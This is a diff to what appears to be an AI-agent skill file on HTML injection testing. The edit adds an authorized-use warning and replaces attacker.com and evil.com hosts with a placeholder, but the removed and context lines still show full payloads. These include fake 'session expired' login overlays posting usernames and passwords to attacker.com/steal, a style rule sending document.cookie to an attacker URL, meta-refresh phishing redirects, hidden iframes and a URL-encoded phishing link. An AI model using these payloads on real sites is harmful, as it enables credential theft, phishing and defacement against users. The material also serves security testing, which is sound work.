@@ -1,13 +1,20 @@
 ---
 name: html-injection-testing
 description: "Identify and exploit HTML injection vulnerabilities that allow attackers to inject malicious HTML content into web applications. This vulnerability enables attackers to modify page appearance, create phishing pages, and steal user credentials through injected forms."
-risk: unknown
+risk: offensive
 source: community
 author: zebbern
 date_added: "2026-02-27"
 ---
 
+> **⚠️ AUTHORIZED USE ONLY**
+> This skill is for educational purposes or authorized security assessments only.
+> You must have explicit, written permission from the system owner before using this tool.
+> Misuse of this tool is illegal and strictly prohibited.
+
 # HTML Injection Testing
+
+Ask the user to verify the target URL/IP before running any commands.
 
 ## Purpose
 
@@ -115,11 +122,11 @@ Test with simple HTML tags:
 <br><br><br>Line breaks
 
 <!-- Links -->
-<a href="http://attacker.com">Click Here</a>
-<a href="http://attacker.com">Legitimate Link</a>
+<a href="[SAFE-PAYLOAD]">Click Here</a>
+<a href="[SAFE-PAYLOAD]">Legitimate Link</a>
 
 <!-- Images -->
-<img src="http://attacker.com/image.png">
+<img src="[SAFE-PAYLOAD]/image.png">
 <img src="x" onerror="alert(1)">  <!-- XSS attempt -->
 ```
 
@@ -146,12 +153,12 @@ Payload persists in database:
 Name: John Doe
 Bio: <div style="position:absolute;top:0;left:0;width:100%;height:100%;background:white;">
      <h1>Site Under Maintenance</h1>
-     <p>Please login at <a href="http://attacker.com/login">portal.company.com</a></p>
+     <p>Please login at <a href="[SAFE-PAYLOAD]/login">portal.company.com</a></p>
      </div>
 
 <!-- Comment injection -->
 Great article!
-<form action="http://attacker.com/steal" method="POST">
+<form action="[SAFE-PAYLOAD]/steal" method="POST">
     <input name="username" placeholder="Session expired. Enter username:">
     <input name="password" type="password" placeholder="Password:">
     <input type="submit" value="Login">
@@ -164,7 +171,7 @@ Payload in URL parameters:
 
 ```html
 <!-- URL injection -->
-http://target.com/welcome?name=<h1>Welcome%20Admin</h1><form%20action="http://attacker.com/steal">
+http://target.com/welcome?name=<h1>Welcome%20Admin</h1><form%20action="[SAFE-PAYLOAD]/steal">
 
 <!-- Search result injection -->
 http://target.com/search?q=<marquee>Your%20account%20has%20been%20compromised</marquee>
@@ -206,7 +213,7 @@ Create convincing phishing forms:
             background:white;z-index:9999;padding:50px;">
     <h2>Session Expired</h2>
     <p>Your session has expired. Please log in again.</p>
-    <form action="http://attacker.com/capture" method="POST">
+    <form action="[SAFE-PAYLOAD]/capture" method="POST">
         <label>Username:</label><br>
         <input type="text" name="username" style="width:200px;"><br><br>
         <label>Password:</label><br>
@@ -217,9 +224,9 @@ Create convincing phishing forms:
 
 <!-- Hidden credential stealer -->
 <style>
-    input { background: url('http://attacker.com/log?data=') }
+    input { background: url('[SAFE-PAYLOAD]/log?data=') }
 </style>
-<form action="http://attacker.com/steal" method="POST">
+<form action="[SAFE-PAYLOAD]/steal" method="POST">
     <input name="user" placeholder="Verify your username">
     <input name="pass" type="password" placeholder="Verify your password">
     <button>Verify</button>
@@ -228,7 +235,7 @@ Create convincing phishing forms:
 
 URL-encoded phishing link:
 ```
-http://target.com/page?msg=%3Cdiv%20style%3D%22position%3Afixed%3Btop%3A0%3Bleft%3A0%3Bwidth%3A100%25%3Bheight%3A100%25%3Bbackground%3Awhite%3Bz-index%3A9999%3Bpadding%3A50px%3B%22%3E%3Ch2%3ESession%20Expired%3C%2Fh2%3E%3Cform%20action%3D%22http%3A%2F%2Fattacker.com%2Fcapture%22%3E%3Cinput%20name%3D%22user%22%20placeholder%3D%22Username%22%3E%3Cinput%20name%3D%22pass%22%20type%3D%22password%22%3E%3Cbutton%3ELogin%3C%2Fbutton%3E%3C%2Fform%3E%3C%2Fdiv%3E
+http://target.com/page?msg=%3Cdiv%20style%3D%22position%3Afixed%3Btop%3A0%3Bleft%3A0%3Bwidth%3A100%25%3Bheight%3A100%25%3Bbackground%3Awhite%3Bz-index%3A9999%3Bpadding%3A50px%3B%22%3E%3Ch2%3ESession%20Expired%3C%2Fh2%3E%3Cform%20action%3D%22http%3A%2F%2F[SAFE-PAYLOAD]%2Fcapture%22%3E%3Cinput%20name%3D%22user%22%20placeholder%3D%22Username%22%3E%3Cinput%20name%3D%22pass%22%20type%3D%22password%22%3E%3Cbutton%3ELogin%3C%2Fbutton%3E%3C%2Fform%3E%3C%2Fdiv%3E
 ```
 
 ### Phase 6: Defacement Payloads
@@ -250,7 +257,7 @@ Website appearance manipulation:
 </body>
 
 <!-- Image injection -->
-<img src="http://attacker.com/defaced.jpg" 
+<img src="[SAFE-PAYLOAD]/defaced.jpg"
      style="position:fixed;top:0;left:0;width:100%;height:100%;z-index:9999">
 
 <!-- Marquee injection (visible movement) -->
@@ -266,20 +273,20 @@ Website appearance manipulation:
 ```html
 <!-- Style injection -->
 <style>
-    body { background: url('http://attacker.com/track?cookie='+document.cookie) }
+    body { background: url('[SAFE-PAYLOAD]/track?cookie='+document.cookie) }
     .content { display: none }
     .fake-content { display: block }
 </style>
 
 <!-- Inline style injection -->
-<div style="background:url('http://attacker.com/log')">Content</div>
+<div style="background:url('[SAFE-PAYLOAD]/log')">Content</div>
 ```
 
 #### Meta Tag Injection
 
 ```html
 <!-- Redirect via meta refresh -->
-<meta http-equiv="refresh" content="0;url=http://attacker.com/phish">
+<meta http-equiv="refresh" content="0;url=[SAFE-PAYLOAD]/phish">
 
 <!-- CSP bypass attempt -->
 <meta http-equiv="Content-Security-Policy" content="default-src *">
@@ -289,7 +296,7 @@ Website appearance manipulation:
 
 ```html
 <!-- Hijack existing form -->
-<form action="http://attacker.com/steal">
+<form action="[SAFE-PAYLOAD]/steal">
 
 <!-- If form already exists, add input -->
 <input type="hidden" name="extra" value="data">
@@ -300,10 +307,10 @@ Website appearance manipulation:
 
 ```html
 <!-- Embed external content -->
-<iframe src="http://attacker.com/malicious" width="100%" height="500"></iframe>
+<iframe src="[SAFE-PAYLOAD]/malicious" width="100%" height="500"></iframe>
 
 <!-- Invisible tracking iframe -->
-<iframe src="http://attacker.com/track" style="display:none"></iframe>
+<iframe src="[SAFE-PAYLOAD]/track" style="display:none"></iframe>
 ```
 
 ### Phase 8: Bypass Techniques
@@ -375,10 +382,10 @@ payloads = [
     "<b>Bold</b>",
     "<script>alert(1)</script>",
     "<img src=x onerror=alert(1)>",
-    "<a href='http://evil.com'>Click</a>",
+    "<a href='[SAFE-PAYLOAD]'>Click</a>",
     "<div style='color:red'>Styled</div>",
     "<marquee>Moving</marquee>",
-    "<iframe src='http://evil.com'></iframe>",
+    "<iframe src='[SAFE-PAYLOAD]'></iframe>",
 ]
 
 for payload in payloads:
@@ -446,10 +453,10 @@ Server-side protections:
 |---------|---------|
 | `<h1>Test</h1>` | Basic rendering test |
 | `<b>Bold</b>` | Simple formatting |
-| `<a href="evil.com">Link</a>` | Link injection |
+| `<a href="[SAFE-PAYLOAD]">Link</a>` | Link injection |
 | `<img src=x>` | Image tag test |
 | `<div style="color:red">` | Style injection |
-| `<form action="evil.com">` | Form hijacking |
+| `<form action="[SAFE-PAYLOAD]">` | Form hijacking |
 
 ### Injection Contexts
 
